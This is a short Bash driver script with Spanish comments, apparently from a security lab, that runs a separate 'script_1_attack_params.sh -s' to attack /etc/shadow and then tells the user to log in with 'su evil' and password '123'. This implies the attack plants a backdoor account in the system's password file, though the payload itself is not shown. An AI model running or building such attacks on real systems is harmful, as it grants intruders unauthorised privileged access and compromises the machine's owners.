#!/bin/bash

echo "=== Ataque  a y /etc/shadow ==="

# Verifica que el script parametrizado exista
if [ ! -f "./script_1_attack_params.sh" ]; then
    echo "[ERROR] No se encontró script_1_attack_params.sh"
    exit 1
fi
# Ejecutar ataque a /etc/shadow
echo
echo "[+] Ejecutando ataque a /etc/shadow..."
./script_1_attack_params.sh -s

echo
echo "[✓] Ataque combinado finalizado. Intenta: su evil (contraseña: 123)"
